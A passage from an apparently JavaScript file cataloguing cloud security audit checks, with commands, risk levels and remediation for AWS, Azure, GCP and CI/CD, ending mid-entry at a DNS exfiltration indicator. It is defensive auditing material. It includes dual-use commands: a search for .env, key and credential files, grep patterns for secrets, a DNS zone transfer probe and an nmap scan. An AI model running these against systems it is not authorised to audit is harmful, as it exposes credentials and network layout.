    remediation: "Use Azure Key Vault references in ARM parameters. Mark sensitive parameters with secureString type. Never store secrets in template default values."
  }
];

// ---------------------------------------------------------------------------
// 15. CLOUD_NETWORK_SECURITY — network-layer security checks and
//     configurations for cloud environments.
// ---------------------------------------------------------------------------

const CLOUD_NETWORK_SECURITY = [
  {
    name: "aws-vpc-peering-routes",
    description: "Audit VPC peering connections for overly broad route table entries that expose entire VPCs",
    command: "aws ec2 describe-vpc-peering-connections --query 'VpcPeeringConnections[*].[VpcPeeringConnectionId,RequesterVpcInfo.VpcId,AccepterVpcInfo.VpcId,Status.Code]' --output table",
    cloud: "aws",
    risk: "high",
    remediation: "Use specific CIDR routes in peering connections rather than full VPC CIDRs. Consider AWS Transit Gateway for centralized network management with route controls."
  },
  {
    name: "aws-transit-gateway-sharing",
    description: "Check Transit Gateway resource shares for unintended cross-account network access",
    command: "aws ec2 describe-transit-gateway-attachments --query 'TransitGatewayAttachments[*].[TransitGatewayId,ResourceId,ResourceOwnerId,State]' --output table",
    cloud: "aws",
    risk: "high",
    remediation: "Restrict Transit Gateway sharing to specific organizational units. Use Transit Gateway route tables to control traffic flow between VPCs and accounts."
  },
  {
    name: "aws-alb-waf-missing",
    description: "Identify Application Load Balancers without AWS WAF web ACL associations",
    command: "aws elbv2 describe-load-balancers --query 'LoadBalancers[?Type==`application`].LoadBalancerArn' --output text | tr '\\t' '\\n' | while read arn; do waf=$(aws wafv2 get-web-acl-for-resource --resource-arn $arn --query 'WebACL.Name' --output text 2>/dev/null); [ \"$waf\" = \"None\" ] && echo \"NO WAF: $arn\"; done",
    cloud: "aws",
    risk: "high",
    remediation: "Associate a WAF web ACL with all public-facing ALBs. Include managed rule groups for common threats: AWSManagedRulesCommonRuleSet, AWSManagedRulesSQLiRuleSet, AWSManagedRulesKnownBadInputsRuleSet."
  },
  {
    name: "aws-cloudfront-https",
    description: "Check CloudFront distributions for HTTPS enforcement and modern TLS protocol versions",
    command: "aws cloudfront list-distributions --query 'DistributionList.Items[*].[Id,DomainName,ViewerCertificate.MinimumProtocolVersion,DefaultCacheBehavior.ViewerProtocolPolicy]' --output table",
    cloud: "aws",
    risk: "high",
    remediation: "Set ViewerProtocolPolicy to redirect-to-https or https-only. Use TLSv1.2_2021 as minimum protocol version. Enable Origin Access Identity for S3 origins."
  },
  {
    name: "aws-route53-dnssec",
    description: "Check if hosted zones have DNSSEC signing enabled for DNS response integrity",
    command: "aws route53 list-hosted-zones --query 'HostedZones[*].Id' --output text | tr '\\t' '\\n' | while read zid; do ds=$(aws route53 get-dnssec --hosted-zone-id $zid --query 'Status.ServeSignature' --output text 2>/dev/null); echo \"$zid: $ds\"; done",
    cloud: "aws",
    risk: "medium",
    remediation: "Enable DNSSEC signing for public hosted zones: aws route53 enable-hosted-zone-dnssec --hosted-zone-id ZONE_ID. Establish DS records with the domain registrar."
  },
  {
    name: "azure-frontdoor-waf",
    description: "Check Azure Front Door profiles for WAF policy associations",
    command: "az network front-door list --query '[*].[name,frontendEndpoints[0].webApplicationFirewallPolicyLink]' -o table",
    cloud: "azure",
    risk: "high",
    remediation: "Associate a WAF policy with all Front Door endpoints. Enable managed rule sets for OWASP Top 10 protection. Configure custom rules for application-specific threats."
  },
  {
    name: "azure-vnet-peering-audit",
    description: "Audit VNet peering connections for unintended cross-network access and gateway transit settings",
    command: "az network vnet peering list --vnet-name VNET_NAME --resource-group RG_NAME --query '[*].[name,peeringState,allowForwardedTraffic,allowGatewayTransit,allowVirtualNetworkAccess]' -o table",
    cloud: "azure",
    risk: "high",
    remediation: "Review all peering connections. Disable allowForwardedTraffic and allowGatewayTransit unless explicitly required. Use Azure Firewall for centralized traffic inspection."
  },
  {
    name: "azure-ddos-protection",
    description: "Check if Azure DDoS Protection Standard is enabled for VNets containing public-facing resources",
    command: "az network vnet list --query '[*].[name,enableDdosProtection,ddosProtectionPlan]' -o table",
    cloud: "azure",
    risk: "high",
    remediation: "Enable DDoS Protection Standard for VNets with public IP resources. Configure DDoS diagnostic logging and alerting."
  },
  {
    name: "gcp-cloud-armor",
    description: "Check if Cloud Armor security policies are associated with backend services exposed via load balancers",
    command: "gcloud compute backend-services list --project PROJECT_ID --format='table(name,securityPolicy)' --filter='NOT securityPolicy:*'",
    cloud: "gcp",
    risk: "high",
    remediation: "Create Cloud Armor security policies with WAF rules and associate with all public-facing backend services. Enable adaptive protection for automated DDoS response."
  },
  {
    name: "gcp-private-google-access",
    description: "Identify subnets without Private Google Access, forcing instances to use public internet for GCP API access",
    command: "gcloud compute networks subnets list --project PROJECT_ID --format='table(name,region,privateIpGoogleAccess)' --filter='privateIpGoogleAccess=false'",
    cloud: "gcp",
    risk: "medium",
    remediation: "Enable Private Google Access on all subnets: gcloud compute networks subnets update SUBNET --region REGION --enable-private-ip-google-access"
  },
  {
    name: "dns-zone-transfer",
    description: "Test for unauthorized DNS zone transfers that could expose the full DNS zone contents",
    command: "dig axfr @NS_SERVER DOMAIN_NAME",
    cloud: "multi",
    risk: "medium",
    remediation: "Restrict zone transfers to authorized secondary name servers only. Use TSIG keys for zone transfer authentication."
  },
  {
    name: "ssl-tls-configuration",
    description: "Audit TLS configuration of cloud endpoints for weak ciphers, protocols, and certificate issues",
    command: "nmap --script ssl-enum-ciphers -p 443 TARGET_HOST || testssl.sh TARGET_HOST",
    cloud: "multi",
    risk: "high",
    remediation: "Disable TLS 1.0 and 1.1. Remove weak cipher suites (RC4, DES, 3DES, NULL). Enable HSTS headers. Use certificates with RSA-2048+ or ECDSA-256+ keys."
  }
];

// ---------------------------------------------------------------------------
// 16. CLOUD_LOGGING_MONITORING — centralized logging and monitoring
//     checks across cloud providers.
// ---------------------------------------------------------------------------

const CLOUD_LOGGING_MONITORING = [
  {
    name: "aws-cloudwatch-alarms-billing",
    description: "Verify billing alarms are configured to detect unexpected cost spikes indicating compromise or denial-of-wallet",
    command: "aws cloudwatch describe-alarms --alarm-name-prefix 'Billing' --query 'MetricAlarms[*].[AlarmName,StateValue,Threshold]' --output table",
    cloud: "aws",
    risk: "medium",
    remediation: "Create billing alarms at 50%, 80%, and 100% of expected monthly spend. Set up anomaly detection for each service. Configure SNS notifications and auto-remediation for severe anomalies."
  },
  {
    name: "aws-cloudwatch-log-retention",
    description: "Identify CloudWatch log groups with no retention policy, accumulating logs indefinitely with cost implications",
    command: "aws logs describe-log-groups --query 'logGroups[?!retentionInDays].[logGroupName,storedBytes]' --output table",
    cloud: "aws",
    risk: "low",
    remediation: "Set retention policies on all log groups based on compliance requirements. Export critical logs to S3 with lifecycle policies for long-term, cost-effective storage."
  },
  {
    name: "aws-cloudtrail-data-events",
    description: "Check if CloudTrail data events are enabled for S3 and Lambda to capture read/write API activity",
    command: "aws cloudtrail get-event-selectors --trail-name TRAIL_NAME --query 'EventSelectors[*].DataResources' --output json",
    cloud: "aws",
    risk: "medium",
    remediation: "Enable data event logging for S3 (object-level operations) and Lambda (invocations) on trails monitoring sensitive workloads. Use advanced event selectors for fine-grained filtering."
  },
  {
    name: "aws-sns-topic-encryption",
    description: "Verify SNS topics used for security alerts are encrypted with KMS to protect notification content",
    command: "aws sns list-topics --query 'Topics[*].TopicArn' --output text | tr '\\t' '\\n' | while read arn; do enc=$(aws sns get-topic-attributes --topic-arn $arn --query 'Attributes.KmsMasterKeyId' --output text); [ \"$enc\" = \"None\" ] && echo \"UNENCRYPTED: $arn\"; done",
    cloud: "aws",
    risk: "medium",
    remediation: "Enable SSE with KMS for SNS topics carrying sensitive notifications. Use aws/sns managed key or a customer-managed KMS key."
  },
  {
    name: "azure-activity-log-export",
    description: "Verify that Azure Activity Logs are exported to a Log Analytics workspace or storage account for retention",
    command: "az monitor diagnostic-settings subscription list --query 'value[*].[name,logs[?category==`Administrative`].enabled]' -o json",
    cloud: "azure",
    risk: "high",
    remediation: "Create diagnostic settings to export Activity Logs to Log Analytics workspace. Configure retention of at least 90 days. Set up alert rules for critical administrative operations."
  },
  {
    name: "azure-security-center-alerts",
    description: "Review Microsoft Defender for Cloud security alerts and their remediation status",
    command: "az security alert list --query '[?status==`Active`].[alertDisplayName,severity,compromisedEntity]' -o table",
    cloud: "azure",
    risk: "high",
    remediation: "Investigate and remediate all active security alerts. Configure automated responses using workflow automation. Suppress false positives with suppression rules."
  },
  {
    name: "gcp-logging-sinks",
    description: "Verify that aggregated log sinks are configured to export security-relevant logs to a centralized destination",
    command: "gcloud logging sinks list --project PROJECT_ID --format='table(name,destination,filter)'",
    cloud: "gcp",
    risk: "high",
    remediation: "Create organization-level aggregated log sinks for admin activity, data access, and system event logs. Export to a dedicated security project with restricted access."
  },
  {
    name: "gcp-logging-metrics",
    description: "Check if log-based metrics and alerts are configured for security-relevant events",
    command: "gcloud logging metrics list --project PROJECT_ID --format='table(name,filter)'",
    cloud: "gcp",
    risk: "medium",
    remediation: "Create log-based metrics for: IAM policy changes, VPC firewall rule changes, Cloud Storage permission changes, service account key creation, and audit config modifications."
  },
  {
    name: "siem-integration",
    description: "Verify that cloud logs are forwarded to a SIEM or security analytics platform for correlation",
    command: "# Check for common SIEM integrations: Splunk, Sentinel, Chronicle, Elastic\n# AWS: Check for Kinesis Data Firehose or Lambda forwarders\n# Azure: Check for Sentinel data connectors\n# GCP: Check for Chronicle SOAR or Pub/Sub export",
    cloud: "multi",
    risk: "high",
    remediation: "Integrate cloud logs with a SIEM platform. Configure real-time log forwarding via native connectors (Azure Sentinel, GCP Chronicle) or log shippers (Splunk UF, Elastic Agent)."
  }
];

// ---------------------------------------------------------------------------
// 17. CLOUD_IDENTITY_FEDERATION — checks for federated identity and SSO
//     configurations across cloud providers.
// ---------------------------------------------------------------------------

const CLOUD_IDENTITY_FEDERATION = [
  {
    name: "aws-saml-providers",
    description: "Audit SAML identity providers configured in the AWS account for trust relationship security",
    command: "aws iam list-saml-providers --query 'SAMLProviderList[*].Arn' --output text | tr '\\t' '\\n' | while read arn; do echo \"=== $arn ===\"; aws iam get-saml-provider --saml-provider-arn $arn --query 'ValidUntil' --output text; done",
    cloud: "aws",
    risk: "high",
    remediation: "Verify SAML provider metadata is current and from a trusted IdP. Review trust policies on roles that allow SAML-based assumption. Monitor for unexpected SAML provider changes in CloudTrail."
  },
  {
    name: "aws-oidc-providers",
    description: "List OpenID Connect identity providers and verify their trust configurations",
    command: "aws iam list-open-id-connect-providers --query 'OpenIDConnectProviderList[*].Arn' --output text | tr '\\t' '\\n' | while read arn; do aws iam get-open-id-connect-provider --open-id-connect-provider-arn $arn --query '[Url,ClientIDList,ThumbprintList]' --output json; done",
    cloud: "aws",
    risk: "high",
    remediation: "Verify OIDC provider URLs and thumbprints match expected identity providers. Restrict ClientIDList to only required audiences. Review roles with web identity trust policies."
  },
  {
    name: "azure-external-identities",
    description: "Audit Azure AD external collaboration settings and guest user access policies",
    command: "az rest --method GET --url 'https://graph.microsoft.com/v1.0/policies/authorizationPolicy' --query '{guestInviteSettings: guestInviteSettings, allowInvitesFrom: allowInvitesFrom}'",
    cloud: "azure",
    risk: "medium",
    remediation: "Restrict guest user invitations to specific admin roles. Limit guest user permissions to their own directory objects. Configure external collaboration settings to allow only specific domains."
  },
  {
    name: "gcp-workload-identity-pool",
    description: "Audit Workload Identity Federation pools for overly broad attribute conditions",
    command: "gcloud iam workload-identity-pools list --location global --project PROJECT_ID --format='table(name,state,description)' && gcloud iam workload-identity-pools providers list --workload-identity-pool POOL_ID --location global --project PROJECT_ID --format=json",
    cloud: "gcp",
    risk: "high",
    remediation: "Use attribute conditions on workload identity providers to restrict which external identities can impersonate service accounts. Avoid broad conditions like true (match all)."
  },
  {
    name: "multi-cloud-sso-audit",
    description: "Verify that SSO configurations across cloud providers use consistent security policies",
    command: "# Cross-cloud SSO audit checklist:\n# 1. Verify the same IdP (Okta, Azure AD, etc.) is used across all clouds\n# 2. Check session timeout policies match across providers\n# 3. Verify MFA enforcement at the IdP level\n# 4. Review break-glass account procedures for each cloud",
    cloud: "multi",
    risk: "high",
    remediation: "Standardize on a single identity provider for all cloud platforms. Enforce MFA at the IdP level. Configure consistent session timeouts (8-12 hours maximum). Maintain documented break-glass procedures."
  }
];

// ---------------------------------------------------------------------------
// 18. CLOUD_DATA_SECURITY — data protection checks including encryption,
//     classification, and data loss prevention.
// ---------------------------------------------------------------------------

const CLOUD_DATA_SECURITY = [
  {
    name: "aws-macie-enabled",
    description: "Check if Amazon Macie is enabled for automated sensitive data discovery in S3 buckets",
    command: "aws macie2 get-macie-session --query 'status' --output text",
    cloud: "aws",
    risk: "medium",
    remediation: "Enable Amazon Macie and configure automated discovery jobs for S3 buckets containing sensitive data. Review and act on findings for PII, financial data, and credentials."
  },
  {
    name: "aws-s3-object-lock",
    description: "Identify S3 buckets without Object Lock for regulatory data that requires immutable storage",
    command: "aws s3api list-buckets --query 'Buckets[*].Name' --output text | tr '\\t' '\\n' | while read b; do lock=$(aws s3api get-object-lock-configuration --bucket $b --query 'ObjectLockConfiguration.ObjectLockEnabled' --output text 2>/dev/null); [ \"$lock\" != \"Enabled\" ] && echo \"NO LOCK: $b\"; done",
    cloud: "aws",
    risk: "medium",
    remediation: "Enable S3 Object Lock in compliance mode for buckets storing regulatory data. Object Lock can only be enabled during bucket creation, so migration may be required."
  },
  {
    name: "aws-dynamodb-encryption",
    description: "Check DynamoDB tables for encryption configuration and verify CMK usage for sensitive data",
    command: "aws dynamodb list-tables --query 'TableNames' --output text | tr '\\t' '\\n' | while read t; do enc=$(aws dynamodb describe-table --table-name $t --query 'Table.SSEDescription.SSEType' --output text 2>/dev/null); echo \"$t: $enc\"; done",
    cloud: "aws",
    risk: "medium",
    remediation: "Enable encryption with AWS-owned CMK (default) or customer-managed KMS key for sensitive tables. DynamoDB encrypts all tables at rest by default since 2018."
  },
  {
    name: "azure-information-protection",
    description: "Verify that Azure Information Protection labels are configured for data classification",
    command: "az rest --method GET --url 'https://graph.microsoft.com/v1.0/informationProtection/policy/labels' --query 'value[*].[name,isActive,description]' -o json",
    cloud: "azure",
    risk: "medium",
    remediation: "Configure sensitivity labels for data classification (Public, Internal, Confidential, Highly Confidential). Apply labels automatically using content inspection rules. Enable label analytics."
  },
  {
    name: "azure-storage-cmk",
    description: "Identify Azure Storage accounts not using customer-managed keys for encryption",
    command: "az storage account list --query '[?encryption.keySource!=`Microsoft.Keyvault`].[name,encryption.keySource]' -o table",
    cloud: "azure",
    risk: "medium",
    remediation: "Configure customer-managed keys for storage accounts handling sensitive data. Store keys in Azure Key Vault with soft delete and purge protection enabled."
  },
  {
    name: "gcp-dlp-inspection",
    description: "Verify that Cloud DLP inspection jobs are configured for sensitive data discovery",
    command: "gcloud dlp job-triggers list --project PROJECT_ID --format='table(name,status,inspectJob.storageConfig.datastoreOptions)'",
    cloud: "gcp",
    risk: "medium",
    remediation: "Create DLP job triggers for Cloud Storage buckets, BigQuery datasets, and Datastore kinds containing potentially sensitive data. Configure de-identification templates for data masking."
  },
  {
    name: "gcp-bigquery-cmek",
    description: "Check BigQuery datasets and tables for customer-managed encryption key configuration",
    command: "bq ls --project_id PROJECT_ID --format=json | python3 -c \"import sys,json; ds=json.load(sys.stdin); [print(d['datasetReference']['datasetId'],d.get('defaultEncryptionConfiguration',{}).get('kmsKeyName','DEFAULT')) for d in ds]\"",
    cloud: "gcp",
    risk: "medium",
    remediation: "Configure CMEK for BigQuery datasets containing sensitive data. Set default encryption configuration at the dataset level. Use separate KMS keys for different data classifications."
  },
  {
    name: "cross-cloud-data-residency",
    description: "Audit resource locations across cloud providers to verify data residency compliance",
    command: "# Check data residency across clouds:\n# AWS: aws s3api get-bucket-location, aws rds describe-db-instances (AvailabilityZone)\n# Azure: az resource list --query '[*].[name,location,type]'\n# GCP: gcloud compute instances list --format='table(name,zone)'",
    cloud: "multi",
    risk: "high",
    remediation: "Use organization policies and SCPs to restrict resource creation to approved regions. Implement tag-based governance for data classification. Regular audit resource locations against data residency requirements."
  }
];

// ---------------------------------------------------------------------------
// 19. CLOUD_COST_SECURITY — cost-related security checks to prevent
//     cryptomining, denial-of-wallet, and resource abuse.
// ---------------------------------------------------------------------------

const CLOUD_COST_SECURITY = [
  {
    name: "aws-billing-alerts",
    description: "Verify that billing alerts and budget thresholds are configured to detect cost anomalies from compromise",
    command: "aws budgets describe-budgets --account-id ACCOUNT_ID --query 'Budgets[*].[BudgetName,BudgetLimit.Amount,CalculatedSpend.ActualSpend.Amount]' --output table",
    cloud: "aws",
    risk: "high",
    remediation: "Create AWS Budgets with alert thresholds at 50%, 80%, 100%, and 150% of expected spend. Configure anomaly detection for each service. Set up auto-stop for development resources."
  },
  {
    name: "aws-unused-resources",
    description: "Identify unused AWS resources (EIPs, EBS volumes, load balancers) that indicate abandoned infrastructure or forgotten test resources",
    command: "echo '=== Unattached EIPs ===' && aws ec2 describe-addresses --query 'Addresses[?!InstanceId].[PublicIp,AllocationId]' --output table && echo '=== Unattached EBS ===' && aws ec2 describe-volumes --filters Name=status,Values=available --query 'Volumes[*].[VolumeId,Size,CreateTime]' --output table",
    cloud: "aws",
    risk: "medium",
    remediation: "Implement resource tagging policies. Use AWS Config rules to detect unused resources. Create automated cleanup Lambda functions for resources past their TTL."
  },
  {
    name: "aws-ec2-instance-types",
    description: "Check for expensive GPU/high-memory instance types that may indicate cryptomining activity",
    command: "aws ec2 describe-instances --query 'Reservations[*].Instances[?starts_with(InstanceType,`p3`) || starts_with(InstanceType,`p4`) || starts_with(InstanceType,`g4`) || starts_with(InstanceType,`g5`)].[InstanceId,InstanceType,LaunchTime,Tags[?Key==`Name`].Value|[0]]' --output table",
    cloud: "aws",
    risk: "critical",
    remediation: "Use SCPs to restrict instance types to an approved list. Create CloudWatch alarms for GPU instance launches. Enable GuardDuty for cryptocurrency mining detection."
  },
  {
    name: "azure-cost-alerts",
    description: "Verify that Azure cost management alerts are configured for budget tracking",
    command: "az consumption budget list --query '[*].[name,amount,timeGrain,currentSpend.amount]' -o table",
    cloud: "azure",
    risk: "high",
    remediation: "Create budgets for each subscription and resource group. Configure action groups for email and webhook notifications at threshold breaches. Use Azure Advisor for cost optimization."
  },
  {
    name: "gcp-billing-export",
    description: "Verify that GCP billing data is exported to BigQuery for detailed cost analysis and anomaly detection",
    command: "gcloud billing accounts list --format='table(name,displayName,open)' && gcloud beta billing accounts describe BILLING_ACCOUNT_ID --format=json",
    cloud: "gcp",
    risk: "medium",
    remediation: "Export billing data to BigQuery for analysis. Set up budget alerts in the GCP console. Use Recommender API for cost optimization suggestions."
  }
];

// ---------------------------------------------------------------------------
// 20. CLOUD_SUPPLY_CHAIN — supply chain security checks for cloud
//     deployments, CI/CD pipelines, and third-party integrations.
// ---------------------------------------------------------------------------

const CLOUD_SUPPLY_CHAIN = [
  {
    name: "github-actions-secrets",
    description: "Audit GitHub Actions workflows for hardcoded secrets and overly permissive permissions",
    command: "find . -path './.github/workflows/*.yml' -exec grep -lE 'password|secret|token|api_key' {} \\; && find . -path './.github/workflows/*.yml' -exec grep -l 'permissions:.*write-all' {} \\;",
    tool: "grep / gitleaks",
    risk: "critical",
    remediation: "Use GitHub encrypted secrets. Set workflow permissions to read-only by default. Pin action versions to SHA commits. Enable Dependabot for action version updates."
  },
  {
    name: "cicd-pipeline-injection",
    description: "Check CI/CD pipeline configurations for command injection vulnerabilities through untrusted inputs",
    command: "find . -path './.github/workflows/*.yml' -exec grep -l '\\${{.*github.event.*}}' {} \\;",
    tool: "grep / semgrep",
    risk: "critical",
    remediation: "Never interpolate untrusted inputs (PR titles, branch names, commit messages) directly into shell commands. Use intermediate environment variables and proper escaping."
  },
  {
    name: "container-registry-access",
    description: "Audit container registry access policies for overly broad push permissions",
    command: "aws ecr describe-repositories --query 'repositories[*].repositoryName' --output text | tr '\\t' '\\n' | while read r; do pol=$(aws ecr get-repository-policy --repository-name $r 2>/dev/null); echo \"$r: $pol\" | grep -q '\"*\"' && echo \"OPEN PUSH: $r\"; done",
    tool: "aws-cli / az-cli / gcloud",
    risk: "high",
    remediation: "Restrict container registry push access to CI/CD service accounts only. Enable image scanning on push. Implement image signing with Cosign or Notary. Use immutable tags."
  },
  {
    name: "terraform-module-pinning",
    description: "Check Terraform modules for unpinned source references that could introduce supply chain attacks",
    command: "grep -rnE 'source\\s*=.*github|source\\s*=.*registry' *.tf | grep -v 'version\\s*=' | grep -v '?ref='",
    tool: "tfsec / checkov",
    risk: "high",
    remediation: "Pin all Terraform module sources to specific versions or git commit SHAs. Use a private module registry for internal modules. Verify module checksums in .terraform.lock.hcl."
  },
  {
    name: "dependency-confusion",
    description: "Check for internal package names that could be targeted by dependency confusion attacks on public registries",
    command: "# Check for private package names in package.json, requirements.txt, pom.xml\n# Verify that private registries are configured as primary sources\n# Check for namespace/scope prefixes on internal packages",
    tool: "manual / confused",
    risk: "critical",
    remediation: "Use scoped package names (@org/package) for internal packages. Configure .npmrc, pip.conf, or settings.xml to prioritize private registries. Register placeholder packages on public registries."
  },
  {
    name: "sbom-generation",
    description: "Verify that Software Bill of Materials (SBOM) is generated for all deployed artifacts",
    command: "syft IMAGE:TAG -o spdx-json > sbom.json && grype sbom:sbom.json --output json",
    tool: "syft / trivy / cyclonedx",
    risk: "medium",
    remediation: "Generate SBOMs for all container images and deployment artifacts. Store SBOMs alongside built artifacts. Continuously scan SBOMs against updated vulnerability databases."
  }
];

// ---------------------------------------------------------------------------
// 21. CLOUD_SECRETS_MANAGEMENT — secrets management best practices and
//     detection patterns for leaked credentials across cloud platforms.
// ---------------------------------------------------------------------------

const CLOUD_SECRETS_MANAGEMENT = [
  {
    name: "gitleaks-scan",
    description: "Scan git repositories for committed secrets, API keys, and credentials using Gitleaks",
    command: "gitleaks detect --source . --report-format json --report-path gitleaks-report.json",
    tool: "gitleaks",
    risk: "critical",
    remediation: "Install Gitleaks as a pre-commit hook. Rotate any discovered secrets immediately. Use git-filter-repo to remove secrets from git history. Never commit secrets to version control."
  },
  {
    name: "trufflehog-scan",
    description: "Deep scan git history for high-entropy strings and credential patterns using TruffleHog",
    command: "trufflehog git file://. --json --only-verified",
    tool: "trufflehog",
    risk: "critical",
    remediation: "Integrate TruffleHog into CI/CD pipelines. Investigate and rotate all verified findings. Use --only-verified flag to reduce false positives in automated scans."
  },
  {
    name: "aws-secrets-manager-audit",
    description: "Audit AWS Secrets Manager for secrets without rotation, without encryption, or with overly broad access policies",
    command: "aws secretsmanager list-secrets --query 'SecretList[*].[Name,RotationEnabled,KmsKeyId,LastRotatedDate]' --output table",
    cloud: "aws",
    risk: "high",
    remediation: "Enable automatic rotation for all secrets. Use customer-managed KMS keys for encryption. Restrict access with resource policies. Monitor access via CloudTrail data events."
  },
  {
    name: "azure-keyvault-audit-logging",
    description: "Verify that Key Vault diagnostic logging is enabled to track all secret, key, and certificate access",
    command: "az keyvault list --query '[*].name' -o tsv | while read kv; do diag=$(az monitor diagnostic-settings list --resource $(az keyvault show --name $kv --query id -o tsv) --query 'value[0].logs[?category==`AuditEvent`].enabled' -o tsv 2>/dev/null); [ \"$diag\" != \"true\" ] && echo \"NO AUDIT LOGGING: $kv\"; done",
    cloud: "azure",
    risk: "high",
    remediation: "Enable diagnostic settings on all Key Vaults with AuditEvent log category. Send logs to Log Analytics workspace. Create alerts for unusual access patterns."
  },
  {
    name: "gcp-secret-manager-access",
    description: "Audit Secret Manager IAM bindings for overly broad access to secrets",
    command: "gcloud secrets list --project PROJECT_ID --format='value(name)' | while read s; do echo \"=== $s ===\"; gcloud secrets get-iam-policy $s --project PROJECT_ID --format=json 2>/dev/null | python3 -c \"import sys,json; p=json.load(sys.stdin); [print(b['role'],m) for b in p.get('bindings',[]) for m in b['members']]\"; done",
    cloud: "gcp",
    risk: "high",
    remediation: "Apply least-privilege IAM bindings on individual secrets. Use secret versions for rotation. Enable audit logging for Secret Manager access. Set automatic replication policies."
  },
  {
    name: "hashicorp-vault-audit",
    description: "Verify that HashiCorp Vault audit logging is enabled and all auth methods are properly configured",
    command: "vault audit list -detailed && vault auth list -detailed && vault policy list",
    tool: "vault",
    risk: "high",
    remediation: "Enable at least two audit devices (file and syslog). Review auth methods for unnecessary backends. Audit policies for overly broad path permissions. Enable response wrapping for sensitive operations."
  },
  {
    name: "env-file-exposure",
    description: "Scan for exposed .env files, configuration files, and credential stores in deployed applications",
    command: "find . -name '.env*' -o -name 'credentials*' -o -name '*.pem' -o -name '*.key' -o -name 'kubeconfig*' -o -name '.npmrc' -o -name '.pypirc' | head -50",
    tool: "filesystem",
    risk: "critical",
    remediation: "Add credential files to .gitignore and .dockerignore. Use secrets managers for credential delivery. Scan CI/CD artifacts for accidentally included secret files. Configure web servers to deny access to dot-files."
  },
  {
    name: "aws-ssm-parameter-store-audit",
    description: "List SSM Parameter Store parameters, checking for unencrypted SecureString parameters",
    command: "aws ssm describe-parameters --query 'Parameters[*].[Name,Type,KeyId]' --output table | grep -v SecureString",
    cloud: "aws",
    risk: "medium",
    remediation: "Store all sensitive values as SecureString type with KMS encryption. Use parameter hierarchies for organized access control. Restrict access with IAM policies scoped to parameter name prefixes."
  }
];

// ---------------------------------------------------------------------------
// 22. CLOUD_INCIDENT_INDICATORS — indicators of compromise and detection
//     patterns for common cloud attack scenarios.
// ---------------------------------------------------------------------------

const CLOUD_INCIDENT_INDICATORS = [
  {
    name: "aws-unauthorized-api-calls",
    description: "Detect unauthorized API calls (AccessDenied errors) that may indicate credential enumeration or privilege escalation attempts",
    detection: "aws logs filter-log-events --log-group-name CloudTrail/DefaultLogGroup --filter-pattern '{$.errorCode = \"AccessDenied\"}' --start-time EPOCH_MS",
    cloud: "aws",
    severity: "medium",
    response: "Investigate the source identity and IP. Check if the calls are from a legitimate user hitting permission boundaries or an attacker probing for accessible actions."
  },
  {
    name: "aws-console-login-without-mfa",
    description: "Detect AWS console logins without MFA, which may indicate compromised credentials or policy bypass",
    detection: "aws logs filter-log-events --log-group-name CloudTrail/DefaultLogGroup --filter-pattern '{$.eventName = \"ConsoleLogin\" && $.additionalEventData.MFAUsed = \"No\"}' --start-time EPOCH_MS",
    cloud: "aws",
    severity: "high",
    response: "Verify the login is from a known user. Check IP geolocation and user agent. If suspicious, force password reset and revoke all sessions."
  },
  {
    name: "aws-root-account-usage",
    description: "Detect any API calls made with root account credentials, which should never be used for day-to-day operations",
    detection: "aws logs filter-log-events --log-group-name CloudTrail/DefaultLogGroup --filter-pattern '{$.userIdentity.type = \"Root\"}' --start-time EPOCH_MS",
    cloud: "aws",
    severity: "critical",
    response: "Immediately investigate all root account usage. The root account should only be used for account setup tasks. Change root password and MFA device if unauthorized."
  },
  {
    name: "aws-iam-policy-changes",
    description: "Monitor for IAM policy creation and modification that could indicate privilege escalation",
    detection: "aws logs filter-log-events --log-group-name CloudTrail/DefaultLogGroup --filter-pattern '{($.eventName = CreatePolicy) || ($.eventName = AttachRolePolicy) || ($.eventName = AttachUserPolicy) || ($.eventName = PutRolePolicy) || ($.eventName = PutUserPolicy)}' --start-time EPOCH_MS",
    cloud: "aws",
    severity: "high",
    response: "Review the policy changes for scope and impact. Verify the changes were authorized through change management. Check if the new permissions follow least-privilege principles."
  },
  {
    name: "aws-ec2-instance-launched-unusual-region",
    description: "Detect EC2 instances launched in regions not typically used by the organization, often indicating cryptomining",
    detection: "for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do count=$(aws ec2 describe-instances --region $region --query 'Reservations[*].Instances[*].InstanceId' --output text | wc -w); [ \"$count\" -gt 0 ] && echo \"$region: $count instances\"; done",
    cloud: "aws",
    severity: "critical",
    response: "Immediately investigate instances in unexpected regions. Check for GPU/compute-optimized types indicating mining. Terminate unauthorized instances and revoke the credentials used to launch them."
  },
  {
    name: "aws-s3-exfiltration-pattern",
    description: "Detect unusual S3 data transfer patterns that may indicate data exfiltration",
    detection: "aws s3api list-buckets --query 'Buckets[*].Name' --output text | tr '\\t' '\\n' | while read b; do bytes=$(aws cloudwatch get-metric-statistics --namespace AWS/S3 --metric-name BytesDownloaded --dimensions Name=BucketName,Value=$b --start-time $(date -u -d '-24 hours' +%Y-%m-%dT%H:%M:%S) --end-time $(date -u +%Y-%m-%dT%H:%M:%S) --period 86400 --statistics Sum --query 'Datapoints[0].Sum' --output text 2>/dev/null); echo \"$b: $bytes bytes\"; done",
    cloud: "aws",
    severity: "high",
    response: "Compare download volumes against baselines. Check CloudTrail S3 data events for the source IP and identity. Look for GetObject calls to sensitive buckets from unusual locations."
  },
  {
    name: "azure-impossible-travel",
    description: "Detect sign-ins from geographically distant locations within a short time frame",
    detection: "az rest --method GET --url 'https://graph.microsoft.com/v1.0/auditLogs/signIns?$filter=riskLevel eq \"high\"&$top=50' --query 'value[*].[userDisplayName,ipAddress,location.city,createdDateTime,riskDetail]'",
    cloud: "azure",
    severity: "high",
    response: "Review the flagged sign-ins for legitimate VPN usage. If confirmed suspicious, disable the account, force password reset, and revoke all refresh tokens."
  },
  {
    name: "gcp-sa-key-creation",
    description: "Detect creation of new service account keys which may indicate persistence establishment by an attacker",
    detection: "gcloud logging read 'protoPayload.methodName=\"google.iam.admin.v1.CreateServiceAccountKey\"' --project PROJECT_ID --freshness=24h --format=json",
    cloud: "gcp",
    severity: "high",
    response: "Verify the key creation was authorized. Check who created the key and for which service account. If unauthorized, delete the key and investigate the compromised identity."
  },
  {
    name: "k8s-suspicious-exec",
    description: "Detect kubectl exec sessions into pods which may indicate interactive compromise or lateral movement",
    detection: "kubectl get events --all-namespaces --field-selector reason=ExecCreate --sort-by=.metadata.creationTimestamp | tail -20",
    cloud: "multi",
    severity: "medium",
    response: "Review exec sessions for unexpected source users or service accounts. Correlate with pod names to identify sensitive workloads. Check if the exec was from an authorized operator or CI/CD pipeline."
  },
  {
    name: "dns-exfiltration-pattern",
